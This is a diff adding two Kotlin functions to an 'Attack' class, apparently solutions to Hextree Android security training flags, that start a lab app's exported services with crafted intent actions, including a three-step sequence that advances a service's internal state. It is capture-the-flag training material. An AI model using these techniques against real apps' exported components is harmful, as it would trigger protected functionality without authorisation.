@@ -419,6 +419,58 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 		context.startActivity(intent)
 	}
 
+// ------------------- Services Flags ------------------------//
+
+	/**
+	 * FLAG 24 - Direct Service Start
+	 * Technique: Explicit Service Start + Action Matching
+	 *
+	 * Flow:
+	 * 1. Flag24Service is exported - started directly via setClassName(), no activity involved
+	 * 2. onStartCommand() checks intent.action against a hardcoded expected string
+	 * 3. Match "io.hextree.services.START_FLAG24_SERVICE" -> success()
+	 *
+	 * Key insight: Same action-string trust as Flag2's activity - just reached via
+	 * startService()/onStartCommand() instead of startActivity()/onCreate().
+	 */
+	fun flag24() {
+		val servicePath = "$packageName.services.Flag24Service"
+		val intent = Intent().apply {
+			setClassName(packageName, servicePath)
+			action = "io.hextree.services.START_FLAG24_SERVICE"
+		}
+		context.startService(intent)
+	}
+
+	/**
+	 * FLAG 25 - Service State Machine
+	 * Technique: Sequential startService() calls advancing internal state
+	 *
+	 * Flow:
+	 * 1. Flag25Service tracks a state counter across repeated onStartCommand() calls
+	 * 2. UNLOCK1 -> UNLOCK2 -> UNLOCK3 must arrive in that order to advance it
+	 * 3. Final UNLOCK3 with state already at step 2 -> success()
+	 *
+	 * Key insight: Unlike Flag4's activity version, no background-launch restriction
+	 * applies to startService() - each call queues and runs onStartCommand() in order,
+	 * so a plain forEach with no taps/delays just works.
+	 */
+	fun flag25() {
+		val servicePath = "$packageName.services.Flag25Service"
+		val flag25Actions = listOf(
+			"io.hextree.services.UNLOCK1",
+			"io.hextree.services.UNLOCK2",
+			"io.hextree.services.UNLOCK3"
+		)
+
+		flag25Actions.forEach { newAction ->
+			val intent = Intent().apply {
+				setClassName(packageName, servicePath)
+				action = newAction
+			}
+			context.startService(intent)
+		}
+	}
 
 // ------------------- Content Providers Flags ------------------------//
 
